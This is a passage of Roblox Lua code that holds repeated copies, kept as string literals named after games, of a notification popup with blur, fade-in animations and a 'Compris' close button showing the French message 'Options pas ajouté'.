local dotIndicator = Instance.new("Frame")
dotIndicator.Name = "DotIndicator"
dotIndicator.Size = UDim2.new(0, 6, 0, 6)
dotIndicator.Position = UDim2.new(0, 0, 0, 4)
dotIndicator.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
dotIndicator.BorderSizePixel = 0
dotIndicator.Parent = headerFrame

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dotIndicator

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(0, 100, 1, 0)
titleLabel.Position = UDim2.new(0, 12, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "NOTIFICATION"
titleLabel.TextColor3 = Color3.fromRGB(160, 165, 190)
titleLabel.TextSize = 10
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextTransparency = 1
titleLabel.Parent = headerFrame

local versionLabel = Instance.new("TextLabel")
versionLabel.Name = "VersionLabel"
versionLabel.Size = UDim2.new(1, 0, 0, 30)
versionLabel.Position = UDim2.new(0, 0, 0, 32)
versionLabel.BackgroundTransparency = 1
versionLabel.Text = "Information"
versionLabel.TextColor3 = Color3.fromRGB(245, 245, 255)
versionLabel.TextSize = 22
versionLabel.Font = Enum.Font.GothamBold
versionLabel.TextXAlignment = Enum.TextXAlignment.Left
versionLabel.TextTransparency = 1
versionLabel.Parent = contentFrame

local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Size = UDim2.new(1, 0, 0, 72)
messageLabel.Position = UDim2.new(0, 0, 0, 68)
messageLabel.BackgroundTransparency = 1
messageLabel.Text = "Options pas ajouté"
messageLabel.TextColor3 = Color3.fromRGB(135, 140, 165)
messageLabel.TextSize = 12
messageLabel.Font = Enum.Font.Gotham
messageLabel.TextXAlignment = Enum.TextXAlignment.Left
messageLabel.TextYAlignment = Enum.TextYAlignment.Top
messageLabel.TextWrapped = true
messageLabel.LineHeight = 1.55
messageLabel.TextTransparency = 1
messageLabel.Parent = contentFrame

local divider = Instance.new("Frame")
divider.Name = "Divider"
divider.Size = UDim2.new(1, 0, 0, 1)
divider.Position = UDim2.new(0, 0, 0, 148)
divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
divider.BackgroundTransparency = 0.95
divider.BorderSizePixel = 0
divider.Parent = contentFrame

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 90, 0, 30)
closeButton.Position = UDim2.new(0, 0, 0, 158)
closeButton.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
closeButton.BackgroundTransparency = 0.88
closeButton.BorderSizePixel = 0
closeButton.Text = "Compris"
closeButton.TextColor3 = Color3.fromRGB(210, 210, 230)
closeButton.TextSize = 11
closeButton.Font = Enum.Font.GothamBold
closeButton.TextTransparency = 1
closeButton.AutoButtonColor = false
closeButton.ZIndex = 1
closeButton.Parent = contentFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 5)
buttonCorner.Parent = closeButton

local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 160, 245))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = closeButton

local isClosing = false

local function closeGui()
    if isClosing then return end
    isClosing = true

    TweenService:Create(blur, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = 0 }):Play()
    TweenService:Create(darkOverlay, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()
    
    local fadeOut = TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 })
    local scaleOut = TweenService:Create(mainContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = UDim2.new(0, 380, 0, 185) })
    local posOut = TweenService:Create(mainContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Position = UDim2.new(0.5, 0, 0.52, 0) })

    for _, element in pairs(contentFrame:GetChildren()) do
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            TweenService:Create(element, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { TextTransparency = 1 }):Play()
        end
    end

    TweenService:Create(accentGlow, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(uiStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Transparency = 1 }):Play()
    TweenService:Create(dotIndicator, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()

    fadeOut:Play()
    scaleOut:Play()
    posOut:Play()

    posOut.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = 8 }):Play()
TweenService:Create(darkOverlay, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { BackgroundTransparency = 0.45 }):Play()

local fadeIn = TweenService:Create(mainFrame, tweenInfo, { BackgroundTransparency = 0.3 })
local scaleIn = TweenService:Create(mainContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(0, 420, 0, 210) })
local posIn = TweenService:Create(mainContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Position = UDim2.new(0.5, 0, 0.5, 0) })

mainContainer.Size = UDim2.new(0, 370, 0, 175)
mainContainer.Position = UDim2.new(0.5, 0, 0.52, 0)

local allTextElements = {}
for _, element in pairs(contentFrame:GetChildren()) do
    if element:IsA("TextLabel") or element:IsA("TextButton") then
        table.insert(allTextElements, element)
    end
end
table.insert(allTextElements, titleLabel)
table.insert(allTextElements, dotIndicator)

fadeIn:Play()
scaleIn:Play()
posIn:Play()

for i, element in ipairs(allTextElements) do
    task.delay(i * 0.05, function()
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            TweenService:Create(element, tweenInfo, { TextTransparency = 0 }):Play()
        elseif element.Name == "DotIndicator" then
            TweenService:Create(element, tweenInfo, { BackgroundTransparency = 0 }):Play()
        end
    end)
end

closeButton.MouseEnter:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.78,
        TextColor3 = Color3.fromRGB(255, 255, 255)
    }):Play()
    TweenService:Create(buttonGradient, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 140, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 180, 255))
        })
    }):Play()
end)

closeButton.MouseLeave:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.88,
        TextColor3 = Color3.fromRGB(210, 210, 230)
    }):Play()
    TweenService:Create(buttonGradient, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 160, 245))
        })
    }):Play()
end)

closeButton.MouseButton1Click:Connect(closeGui)
]]

local grow_garden = [[
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local existingGui = playerGui:FindFirstChild("UpdateGui")
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UpdateGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local blur = Instance.new("BlurEffect")
blur.Name = "BackgroundBlur"
blur.Size = 0
blur.Parent = screenGui

local darkOverlay = Instance.new("Frame")
darkOverlay.Name = "DarkOverlay"
darkOverlay.Size = UDim2.new(1, 0, 1, 0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
darkOverlay.BackgroundTransparency = 1
darkOverlay.BorderSizePixel = 0
darkOverlay.ZIndex = 0
darkOverlay.Parent = screenGui

local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(0, 420, 0, 210)
mainContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
mainContainer.AnchorPoint = Vector2.new(0.5, 0.5)
mainContainer.BackgroundTransparency = 1
mainContainer.BorderSizePixel = 0
mainContainer.ZIndex = 1
mainContainer.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 19)
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 1
mainFrame.Parent = mainContainer

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = mainFrame

local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(255, 255, 255)
uiStroke.Transparency = 0.93
uiStroke.Thickness = 0.5
uiStroke.Parent = mainFrame

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 24, 1, 24)
shadow.Position = UDim2.new(0, -12, 0, -12)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://6014261993"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.65
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(49, 49, 450, 450)
shadow.ZIndex = 0
shadow.Parent = mainFrame

local accentGlow = Instance.new("Frame")
accentGlow.Name = "AccentGlow"
accentGlow.Size = UDim2.new(0, 4, 1, -20)
accentGlow.Position = UDim2.new(0, 0, 0, 10)
accentGlow.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
accentGlow.BorderSizePixel = 0
accentGlow.ZIndex = 2
accentGlow.Parent = mainFrame

local accentGlowCorner = Instance.new("UICorner")
accentGlowCorner.CornerRadius = UDim.new(1, 0)
accentGlowCorner.Parent = accentGlow

local accentGradient = Instance.new("UIGradient")
accentGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 180, 255))
})
accentGradient.Rotation = 180
accentGradient.Parent = accentGlow

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -32, 1, -28)
contentFrame.Position = UDim2.new(0, 22, 0, 16)
contentFrame.BackgroundTransparency = 1
contentFrame.BorderSizePixel = 0
contentFrame.ZIndex = 1
contentFrame.Parent = mainFrame

local headerFrame = Instance.new("Frame")
headerFrame.Name = "HeaderFrame"
headerFrame.Size = UDim2.new(1, 0, 0, 28)
headerFrame.BackgroundTransparency = 1
headerFrame.BorderSizePixel = 0
headerFrame.Parent = contentFrame

local dotIndicator = Instance.new("Frame")
dotIndicator.Name = "DotIndicator"
dotIndicator.Size = UDim2.new(0, 6, 0, 6)
dotIndicator.Position = UDim2.new(0, 0, 0, 4)
dotIndicator.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
dotIndicator.BorderSizePixel = 0
dotIndicator.Parent = headerFrame

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dotIndicator

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(0, 100, 1, 0)
titleLabel.Position = UDim2.new(0, 12, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "NOTIFICATION"
titleLabel.TextColor3 = Color3.fromRGB(160, 165, 190)
titleLabel.TextSize = 10
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextTransparency = 1
titleLabel.Parent = headerFrame

local versionLabel = Instance.new("TextLabel")
versionLabel.Name = "VersionLabel"
versionLabel.Size = UDim2.new(1, 0, 0, 30)
versionLabel.Position = UDim2.new(0, 0, 0, 32)
versionLabel.BackgroundTransparency = 1
versionLabel.Text = "Information"
versionLabel.TextColor3 = Color3.fromRGB(245, 245, 255)
versionLabel.TextSize = 22
versionLabel.Font = Enum.Font.GothamBold
versionLabel.TextXAlignment = Enum.TextXAlignment.Left
versionLabel.TextTransparency = 1
versionLabel.Parent = contentFrame

local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Size = UDim2.new(1, 0, 0, 72)
messageLabel.Position = UDim2.new(0, 0, 0, 68)
messageLabel.BackgroundTransparency = 1
messageLabel.Text = "Options pas ajouté"
messageLabel.TextColor3 = Color3.fromRGB(135, 140, 165)
messageLabel.TextSize = 12
messageLabel.Font = Enum.Font.Gotham
messageLabel.TextXAlignment = Enum.TextXAlignment.Left
messageLabel.TextYAlignment = Enum.TextYAlignment.Top
messageLabel.TextWrapped = true
messageLabel.LineHeight = 1.55
messageLabel.TextTransparency = 1
messageLabel.Parent = contentFrame

local divider = Instance.new("Frame")
divider.Name = "Divider"
divider.Size = UDim2.new(1, 0, 0, 1)
divider.Position = UDim2.new(0, 0, 0, 148)
divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
divider.BackgroundTransparency = 0.95
divider.BorderSizePixel = 0
divider.Parent = contentFrame

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 90, 0, 30)
closeButton.Position = UDim2.new(0, 0, 0, 158)
closeButton.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
closeButton.BackgroundTransparency = 0.88
closeButton.BorderSizePixel = 0
closeButton.Text = "Compris"
closeButton.TextColor3 = Color3.fromRGB(210, 210, 230)
closeButton.TextSize = 11
closeButton.Font = Enum.Font.GothamBold
closeButton.TextTransparency = 1
closeButton.AutoButtonColor = false
closeButton.ZIndex = 1
closeButton.Parent = contentFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 5)
buttonCorner.Parent = closeButton

local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 160, 245))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = closeButton

local isClosing = false

local function closeGui()
    if isClosing then return end
    isClosing = true

    TweenService:Create(blur, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = 0 }):Play()
    TweenService:Create(darkOverlay, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()
    
    local fadeOut = TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 })
    local scaleOut = TweenService:Create(mainContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = UDim2.new(0, 380, 0, 185) })
    local posOut = TweenService:Create(mainContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Position = UDim2.new(0.5, 0, 0.52, 0) })

    for _, element in pairs(contentFrame:GetChildren()) do
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            TweenService:Create(element, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { TextTransparency = 1 }):Play()
        end
    end

    TweenService:Create(accentGlow, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(uiStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Transparency = 1}):Play()
    TweenService:Create(dotIndicator, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()

    fadeOut:Play()
    scaleOut:Play()
    posOut:Play()

    posOut.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = 8 }):Play()
TweenService:Create(darkOverlay, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { BackgroundTransparency = 0.45 }):Play()

local fadeIn = TweenService:Create(mainFrame, tweenInfo, { BackgroundTransparency = 0.3 })
local scaleIn = TweenService:Create(mainContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(0, 420, 0, 210) })
local posIn = TweenService:Create(mainContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Position = UDim2.new(0.5, 0, 0.5, 0) })

mainContainer.Size = UDim2.new(0, 370, 0, 175)
mainContainer.Position = UDim2.new(0.5, 0, 0.52, 0)

local allTextElements = {}
for _, element in pairs(contentFrame:GetChildren()) do
    if element:IsA("TextLabel") or element:IsA("TextButton") then
        table.insert(allTextElements, element)
    end
end
table.insert(allTextElements, titleLabel)
table.insert(allTextElements, dotIndicator)

fadeIn:Play()
scaleIn:Play()
posIn:Play()

for i, element in ipairs(allTextElements) do
    task.delay(i * 0.05, function()
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            TweenService:Create(element, tweenInfo, { TextTransparency = 0 }):Play()
        elseif element.Name == "DotIndicator" then
            TweenService:Create(element, tweenInfo, { BackgroundTransparency = 0 }):Play()
        end
    end)
end

closeButton.MouseEnter:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.78,
        TextColor3 = Color3.fromRGB(255, 255, 255)
    }):Play()
    TweenService:Create(buttonGradient, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 140, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 180, 255))
        })
    }):Play()
end)

closeButton.MouseLeave:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.88,
        TextColor3 = Color3.fromRGB(210, 210, 230)
    }):Play()
    TweenService:Create(buttonGradient, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 160, 245))
        })
    }):Play()
end)

closeButton.MouseButton1Click:Connect(closeGui)
]]

local tsunami_brainrot = [[
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local existingGui = playerGui:FindFirstChild("UpdateGui")
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UpdateGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local blur = Instance.new("BlurEffect")
blur.Name = "BackgroundBlur"
blur.Size = 0
blur.Parent = screenGui

local darkOverlay = Instance.new("Frame")
darkOverlay.Name = "DarkOverlay"
darkOverlay.Size = UDim2.new(1, 0, 1, 0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
darkOverlay.BackgroundTransparency = 1
darkOverlay.BorderSizePixel = 0
darkOverlay.ZIndex = 0
darkOverlay.Parent = screenGui

local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(0, 420, 0, 210)
mainContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
mainContainer.AnchorPoint = Vector2.new(0.5, 0.5)
mainContainer.BackgroundTransparency = 1
mainContainer.BorderSizePixel = 0
mainContainer.ZIndex = 1
mainContainer.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 19)
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 1
mainFrame.Parent = mainContainer

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = mainFrame

local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(255, 255, 255)
uiStroke.Transparency = 0.93
uiStroke.Thickness = 0.5
uiStroke.Parent = mainFrame

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 24, 1, 24)
shadow.Position = UDim2.new(0, -12, 0, -12)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://6014261993"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.65
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(49, 49, 450, 450)
shadow.ZIndex = 0
shadow.Parent = mainFrame

local accentGlow = Instance.new("Frame")
accentGlow.Name = "AccentGlow"
accentGlow.Size = UDim2.new(0, 4, 1, -20)
accentGlow.Position = UDim2.new(0, 0, 0, 10)
accentGlow.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
accentGlow.BorderSizePixel = 0
accentGlow.ZIndex = 2
accentGlow.Parent = mainFrame

local accentGlowCorner = Instance.new("UICorner")
accentGlowCorner.CornerRadius = UDim.new(1, 0)
accentGlowCorner.Parent = accentGlow

local accentGradient = Instance.new("UIGradient")
accentGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 180, 255))
})
accentGradient.Rotation = 180
accentGradient.Parent = accentGlow

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -32, 1, -28)
contentFrame.Position = UDim2.new(0, 22, 0, 16)
contentFrame.BackgroundTransparency = 1
contentFrame.BorderSizePixel = 0
contentFrame.ZIndex = 1
contentFrame.Parent = mainFrame

local headerFrame = Instance.new("Frame")
headerFrame.Name = "HeaderFrame"
headerFrame.Size = UDim2.new(1, 0, 0, 28)
headerFrame.BackgroundTransparency = 1
headerFrame.BorderSizePixel = 0
headerFrame.Parent = contentFrame

local dotIndicator = Instance.new("Frame")
dotIndicator.Name = "DotIndicator"
dotIndicator.Size = UDim2.new(0, 6, 0, 6)
dotIndicator.Position = UDim2.new(0, 0, 0, 4)
dotIndicator.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
dotIndicator.BorderSizePixel = 0
dotIndicator.Parent = headerFrame

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dotIndicator

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(0, 100, 1, 0)
titleLabel.Position = UDim2.new(0, 12, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "NOTIFICATION"
titleLabel.TextColor3 = Color3.fromRGB(160, 165, 190)
titleLabel.TextSize = 10
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextTransparency = 1
titleLabel.Parent = headerFrame

local versionLabel = Instance.new("TextLabel")
versionLabel.Name = "VersionLabel"
versionLabel.Size = UDim2.new(1, 0, 0, 30)
versionLabel.Position = UDim2.new(0, 0, 0, 32)
versionLabel.BackgroundTransparency = 1
versionLabel.Text = "Information"
versionLabel.TextColor3 = Color3.fromRGB(245, 245, 255)
versionLabel.TextSize = 22
versionLabel.Font = Enum.Font.GothamBold
versionLabel.TextXAlignment = Enum.TextXAlignment.Left
versionLabel.TextTransparency = 1
versionLabel.Parent = contentFrame

local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Size = UDim2.new(1, 0, 0, 72)
messageLabel.Position = UDim2.new(0, 0, 0, 68)
messageLabel.BackgroundTransparency = 1
messageLabel.Text = "Options pas ajouté"
messageLabel.TextColor3 = Color3.fromRGB(135, 140, 165)
messageLabel.TextSize = 12
messageLabel.Font = Enum.Font.Gotham
messageLabel.TextXAlignment = Enum.TextXAlignment.Left
messageLabel.TextYAlignment = Enum.TextYAlignment.Top
messageLabel.TextWrapped = true
messageLabel.LineHeight = 1.55
messageLabel.TextTransparency = 1
messageLabel.Parent = contentFrame

local divider = Instance.new("Frame")
divider.Name = "Divider"
divider.Size = UDim2.new(1, 0, 0, 1)
divider.Position = UDim2.new(0, 0, 0, 148)
divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
divider.BackgroundTransparency = 0.95
divider.BorderSizePixel = 0
divider.Parent = contentFrame

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 90, 0, 30)
closeButton.Position = UDim2.new(0, 0, 0, 158)
closeButton.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
closeButton.BackgroundTransparency = 0.88
closeButton.BorderSizePixel = 0
closeButton.Text = "Compris"
closeButton.TextColor3 = Color3.fromRGB(210, 210, 230)
closeButton.TextSize = 11
closeButton.Font = Enum.Font.GothamBold
closeButton.TextTransparency = 1
closeButton.AutoButtonColor = false
closeButton.ZIndex = 1
closeButton.Parent = contentFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 5)
buttonCorner.Parent = closeButton

local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 160, 245))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = closeButton

local isClosing = false

local function closeGui()
    if isClosing then return end
    isClosing = true

    TweenService:Create(blur, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = 0 }):Play()
    TweenService:Create(darkOverlay, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()
    
    local fadeOut = TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 })
    local scaleOut = TweenService:Create(mainContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = UDim2.new(0, 380, 0, 185) })
    local posOut = TweenService:Create(mainContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Position = UDim2.new(0.5, 0, 0.52, 0) })

    for _, element in pairs(contentFrame:GetChildren()) do
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            TweenService:Create(element, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { TextTransparency = 1 }):Play()
        end
    end

    TweenService:Create(accentGlow, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(uiStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Transparency = 1 }):Play()
    TweenService:Create(dotIndicator, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { BackgroundTransparency = 1 }):Play()

    fadeOut:Play()
    scaleOut:Play()
    posOut:Play()

    posOut.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = 8 }):Play()
TweenService:Create(darkOverlay, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { BackgroundTransparency = 0.45 }):Play()

local fadeIn = TweenService:Create(mainFrame, tweenInfo, { BackgroundTransparency = 0.3 })
local scaleIn = TweenService:Create(mainContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(0, 420, 0, 210) })
local posIn = TweenService:Create(mainContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Position = UDim2.new(0.5, 0, 0.5, 0) })

mainContainer.Size = UDim2.new(0, 370, 0, 175)
mainContainer.Position = UDim2.new(0.5, 0, 0.52, 0)

local allTextElements = {}
for _, element in pairs(contentFrame:GetChildren()) do
    if element:IsA("TextLabel") or element:IsA("TextButton") then
        table.insert(allTextElements, element)
    end
end
table.insert(allTextElements, titleLabel)
